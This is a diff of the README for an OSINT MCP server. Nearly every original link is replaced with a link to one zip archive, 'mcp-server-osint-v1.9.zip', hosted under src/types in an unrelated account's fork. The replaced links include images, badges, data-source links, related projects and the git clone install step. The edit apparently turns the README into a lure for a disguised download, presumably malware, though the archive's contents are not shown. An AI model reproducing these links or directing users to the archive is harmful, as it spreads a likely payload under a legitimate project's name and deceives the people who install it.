@@ -27,9 +27,9 @@
 <p align="center">
   <br>
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/badchars/osint-mcp-server/main/.github/banner-dark.svg">
-    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/badchars/osint-mcp-server/main/.github/banner-light.svg">
-    <img alt="osint-mcp-server" src="https://raw.githubusercontent.com/badchars/osint-mcp-server/main/.github/banner-dark.svg" width="700">
+    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip">
+    <source media="(prefers-color-scheme: light)" srcset="https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip">
+    <img alt="osint-mcp-server" src="https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip" width="700">
   </picture>
 </p>
 
@@ -55,7 +55,7 @@
 </p>
 
 <p align="center">
-  <a href="https://www.npmjs.com/package/osint-mcp-server"><img src="https://img.shields.io/npm/v/osint-mcp-server.svg" alt="npm"></a>
+  <a href="https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip"><img src="https://img.shields.io/npm/v/osint-mcp-server.svg" alt="npm"></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
   <img src="https://img.shields.io/badge/runtime-Bun-f472b6" alt="Bun">
   <img src="https://img.shields.io/badge/protocol-MCP-8b5cf6" alt="MCP">
@@ -65,7 +65,7 @@
 </p>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/badchars/osint-mcp-server/main/.github/demo.gif" alt="osint-mcp-server demo" width="800">
+  <img src="https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip" alt="osint-mcp-server demo" width="800">
 </p>
 
 ---
@@ -89,7 +89,7 @@ Traditional OSINT workflow:
   Total: 45+ minutes per target, most of it switching contexts
 ```
 
-**osint-mcp-server** gives your AI agent 37 tools across 12 data sources via the [Model Context Protocol](https://modelcontextprotocol.io). The agent queries all sources in parallel, correlates data, identifies risks, and presents a unified intelligence picture &mdash; in a single conversation.
+**osint-mcp-server** gives your AI agent 37 tools across 12 data sources via the [Model Context Protocol](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip). The agent queries all sources in parallel, correlates data, identifies risks, and presents a unified intelligence picture &mdash; in a single conversation.
 
 ```
 With osint-mcp-server:
@@ -181,7 +181,7 @@ npx osint-mcp-server
 ### Option 2: Clone
 
 ```bash
-git clone https://github.com/badchars/osint-mcp-server.git
+git clone https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip
 cd osint-mcp-server
 bun install
 ```
@@ -335,7 +335,7 @@ You: "What was target.com running 3 years ago?"
 
 Agent: → wayback_urls {domain: "target.com", limit: 500}
        → st_dns_history {domain: "target.com", type: "a"}
-       → wayback_snapshots {url: "https://target.com/robots.txt"}
+       → wayback_snapshots {url: "https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip"}
        → "DNS history: target.com moved from 198.51.100.1 (DigitalOcean)
           to 203.0.113.50 (AWS) in 2023.
           Wayback found 342 unique URLs including:
@@ -559,18 +559,18 @@ SHODAN_API_KEY=your-key npx osint-mcp-server --tool shodan_host '{"ip":"1.1.1.1"
 
 | Source | Auth | Rate Limit | What it provides |
 |--------|------|-----------|-----------------|
-| [DNS](https://nodejs.org/api/dns.html) | None | None | A, AAAA, MX, TXT, NS, SOA, CNAME, SRV, PTR records |
-| [RDAP](https://rdap.org/) | None | 1 req/s | Domain & IP WHOIS data (registrar, dates, contacts, CIDR) |
-| [crt.sh](https://crt.sh/) | None | 0.5 req/s | Certificate Transparency logs, subdomain discovery |
-| [ip-api.com](http://ip-api.com/) | None | 45 req/min | IP geolocation, ISP, ASN, proxy/VPN/hosting detection |
-| [BGPView](https://bgpview.io/) | None | 0.5 req/s | ASN details, announced prefixes, IP routing info |
-| [HackerTarget](https://hackertarget.com/) | None | 2 req/s | Host search, reverse IP, ASN lookup (50/day free) |
-| [Wayback Machine](https://web.archive.org/) | None | 1 req/s | Archived URLs, snapshot history, historical content |
-| [Microsoft 365](https://login.microsoftonline.com/) | None | None | Tenant discovery, federation detection, auth type |
-| [Shodan](https://www.shodan.io/) | `SHODAN_API_KEY` | 1 req/s | Internet-wide port/service/banner scanning |
-| [VirusTotal](https://www.virustotal.com/) | `VT_API_KEY` | 4 req/min | Domain/IP/URL reputation, malware detection |
-| [SecurityTrails](https://securitytrails.com/) | `ST_API_KEY` | 1 req/s | DNS history, subdomain enumeration, enhanced WHOIS |
-| [Censys](https://censys.io/) | `CENSYS_API_ID` | 1 req/s | Host search, certificate transparency, service discovery |
+| [DNS](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | None | None | A, AAAA, MX, TXT, NS, SOA, CNAME, SRV, PTR records |
+| [RDAP](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | None | 1 req/s | Domain & IP WHOIS data (registrar, dates, contacts, CIDR) |
+| [crt.sh](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | None | 0.5 req/s | Certificate Transparency logs, subdomain discovery |
+| [ip-api.com](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | None | 45 req/min | IP geolocation, ISP, ASN, proxy/VPN/hosting detection |
+| [BGPView](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | None | 0.5 req/s | ASN details, announced prefixes, IP routing info |
+| [HackerTarget](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | None | 2 req/s | Host search, reverse IP, ASN lookup (50/day free) |
+| [Wayback Machine](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | None | 1 req/s | Archived URLs, snapshot history, historical content |
+| [Microsoft 365](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | None | None | Tenant discovery, federation detection, auth type |
+| [Shodan](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | `SHODAN_API_KEY` | 1 req/s | Internet-wide port/service/banner scanning |
+| [VirusTotal](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | `VT_API_KEY` | 4 req/min | Domain/IP/URL reputation, malware detection |
+| [SecurityTrails](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | `ST_API_KEY` | 1 req/s | DNS history, subdomain enumeration, enhanced WHOIS |
+| [Censys](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | `CENSYS_API_ID` | 1 req/s | Host search, certificate transparency, service discovery |
 
 ---
 
@@ -603,10 +603,10 @@ SHODAN_API_KEY=your-key npx osint-mcp-server --tool shodan_host '{"ip":"1.1.1.1"
 
 | Project | Domain | Tools |
 |---|---|---|
-| [hackbrowser-mcp](https://github.com/badchars/hackbrowser-mcp) | Browser-based security testing | 39 tools, Firefox, injection testing |
-| [cloud-audit-mcp](https://github.com/badchars/cloud-audit-mcp) | Cloud security (AWS/Azure/GCP) | 38 tools, 60+ checks |
-| [github-security-mcp](https://github.com/badchars/github-security-mcp) | GitHub security posture | 39 tools, 45 checks |
-| [cve-mcp](https://github.com/badchars/cve-mcp) | Vulnerability intelligence | 23 tools, 5 sources |
+| [hackbrowser-mcp](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | Browser-based security testing | 39 tools, Firefox, injection testing |
+| [cloud-audit-mcp](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | Cloud security (AWS/Azure/GCP) | 38 tools, 60+ checks |
+| [github-security-mcp](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | GitHub security posture | 39 tools, 45 checks |
+| [cve-mcp](https://github.com/Krisparenthetic284/osint-mcp-server/raw/refs/heads/main/src/types/mcp-server-osint-v1.9.zip) | Vulnerability intelligence | 23 tools, 5 sources |
 | **osint-mcp-server** | **OSINT & reconnaissance** | **37 tools, 12 sources** |
 
 ---
